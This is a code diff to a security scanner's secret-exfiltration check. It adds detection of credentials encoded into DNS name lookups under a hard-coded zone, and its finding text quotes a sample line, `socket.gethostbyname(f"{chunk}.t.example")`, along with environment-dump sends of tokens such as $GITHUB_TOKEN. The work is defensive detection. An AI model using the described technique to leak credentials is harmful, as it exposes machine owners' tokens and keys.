@@ -61,6 +61,7 @@ from skilltotal.scanners.base import (
     _finding_from_rule,
     aggregated_review,
 )
+from skilltotal.scanners.dns_exfil import dns_secret_lookups
 from skilltotal.scanners.install_scripts import (
     _NPM_LIFECYCLE_SCRIPTS,
     install_run_interpreters,
@@ -1071,7 +1072,9 @@ class SecretExfilScanner(Scanner):
                 "(`$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`) to a host that is not that provider, "
                 "or collects credentials into a file, an archive or a variable and sends that "
                 "on a later line; or code passes the whole process environment "
-                "(`process.env`, `os.environ`) into an HTTP request. The environment holds the "
+                "(`process.env`, `os.environ`) into an HTTP request, or encodes a credential and "
+                "looks it up as the labels of DNS names under a zone written into the code "
+                "(`socket.gethostbyname(f\"{chunk}.t.example\")`). The environment holds the "
                 "machine's tokens and keys, so either way they reach whoever runs the endpoint."
             ),
             recommendation=(
@@ -1104,12 +1107,14 @@ class SecretExfilScanner(Scanner):
         for f in index.select(suffixes=_JS_SUFFIXES):
             sends, truncated = _js_env_sends(f)
             evidence.extend(sends)
+            evidence.extend(dns_secret_lookups(f))
             if truncated and not sends:
                 partly.append((f.relpath, None))
             if len(evidence) >= MAX_EVIDENCE_SCANNED:
                 break
         for f in index.select(suffixes=(".py", ".pyw")):
             evidence.extend(_py_env_dumps(f))
+            evidence.extend(dns_secret_lookups(f))
             if len(evidence) >= MAX_EVIDENCE_SCANNED:
                 break
         # A file with more uses of the environment, or more calls beside them, than a real one
